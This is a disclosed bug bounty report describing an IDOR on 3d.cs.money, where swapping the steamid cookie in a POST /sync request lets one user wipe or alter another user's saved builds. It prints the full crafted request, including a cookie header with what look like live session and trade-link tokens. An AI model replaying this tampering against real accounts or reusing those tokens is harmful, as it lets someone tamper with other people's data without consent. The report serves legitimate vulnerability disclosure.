# IDOR in https://3d.cs.money/

## Report Details
- **Report ID**: 990878
- **URL**: https://hackerone.com/reports/990878
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-09-25T05:44:28.262Z
- **Disclosed**: 2020-09-28T12:01:21.814Z

## Reporter
- **Username**: khoabda1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: cs_money

## Vulnerability Information
## Summary:
Hello,
I found an IDOR in https://3d.cs.money/ which will allow you to save, edit, delete build of victim account without any grant on the victim account

## Steps To Reproduce:
This bug based on steamID which is reflected on Steam or you can use any Steam ID Finder software to find (https://steamidfinder.com/)
To reproduce this bug, you need to have 2 accounts (attacker and victim)
My pair steamID is 
Attacker: █████
Victim: ████████

- Login in https://new.cs.money with your Attacker account. The website will set my cookie to ` steamid=████████`
- Craft a request to sync your builds like this 

```
POST /sync HTTP/1.1
Host: 3d.cs.money
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/plain, */*
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/json;charset=utf-8
Content-Length: 286
Origin: https://3d.cs.money
Connection: close
Referer: https://3d.cs.money/g3sg1-black-sand-fn
Cookie: __cfduid=dd4a5ae822200c2e5a6622942c8e9b5c61600828055; TEST_GROUP=6; UUID3D=z8yNnunP7rEULv4; _ga=GA1.1.123687832.1600828067; _ga_HY7CCPCD7H=GS1.1.1601010291.13.1.1601011220.60; _gid=GA1.2.745101638.1600828070; language=en; sellerid=2351662; theme=darkTheme; pro_version=false; tmr_reqNum=84; tmr_lvid=a86af86a1e546621ee998805dedf795e; tmr_lvidTS=1600829462593; _ym_uid=1600829464576681153; _ym_d=1600829464; prism_89846284=886529b3-1b72-491d-8e3e-fb061941ce6b; amplitude_id_222f15bd4f15cdfaee99c07bcc641e5fcs.money=eyJkZXZpY2VJZCI6ImJlNWM1YjhmLWE3OTQtNDZiNC1iMzg5LWU2MzljYThkZTNiNlIiLCJ1c2VySWQiOiI3NjU2MTE5ODM4OTQwODM5MiIsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwMDk1MzY5NTUyOCwibGFzdEV2ZW50VGltZSI6MTYwMDk1Mzc5MzEyNywiZXZlbnRJZCI6NDAsImlkZW50aWZ5SWQiOjE4LCJzZXF1ZW5jZU51bWJlciI6NTh9; _fbp=fb.1.1600829468046.1736484188; csmoney_ga=GA1.2.348732095.1600829528; csmoney_ga_gid=GA1.2.929098124.1600829528; type_device=desktop; support_token=6f4a7515e3000799c5b9ffc20b3bdb808e065ec4a7d77c557bf14b72922136d9; amplitude_id_c14fa5162b6e034d1c3b12854f3a26f5cs.money=eyJkZXZpY2VJZCI6IjU0MTdhZjg4LTE0NDgtNDg3NC05YmNkLTFmMjczOGIwY2EyZFIiLCJ1c2VySWQiOiI3NjU2MTE5ODM4OTQwODM5MiIsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwMTAwMzA0MTE2NCwibGFzdEV2ZW50VGltZSI6MTYwMTAwMzA1OTU1MywiZXZlbnRJZCI6MzA2LCJpZGVudGlmeUlkIjo1LCJzZXF1ZW5jZU51bWJlciI6MzExfQ==; amp_d77dd0=nCXsKPRaEaZ_9OrPDjz6cM...1ej1qcnqb.1ej1qjat4.0.1.1; amp_d77dd0_cs.money=nCXsKPRaEaZ_9OrPDjz6cM...1ej1qcnqf.1ej1r92m4.39.2.3a; steamid=████; avatar=https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/9e/9e972864d883f1b2e12cde94c8f83ef005c22438_medium.jpg; username=khoadeptrai; thirdparty_token=83a3e70e33f5a91ced64ee3a0fd005d80e119cb762c2d82449707c0eba6efcf1; trade_link=https%3A%2F%2Fsteamcommunity.com%2Ftradeoffer%2Fnew%2F%3Fpartner%3D429142664%26token%3DI1hTESVQ; _privy_undefined=%7B%22uuid%22%3A%22aa550b56-d1d7-425a-a4f8-28b3b53d6a71%22%7D; _privy_0A13181283E3DE28238D8AB1=%7B%22uuid%22%3A%22aa550b56-d1d7-425a-a4f8-28b3b53d6a71%22%2C%22variations%22%3A%7B%7D%2C%22country_code%22%3A%22VN%22%2C%22region_code%22%3A%22VN_35%22%2C%22postal_code%22%3A%22%22%7D; _ym_isad=2; _ym_visorc_62327980=w

{"backgrounds":["/assets/images/back3.jpeg"],"builds":[],"edition":1}
```

- Change the value of `steamid`cookie to Victim SteamID (████████)
- All the builds in the Victim build list are cleared

## Impact

Add, Edit, Delete any build of any account

## Attachments
No attachments
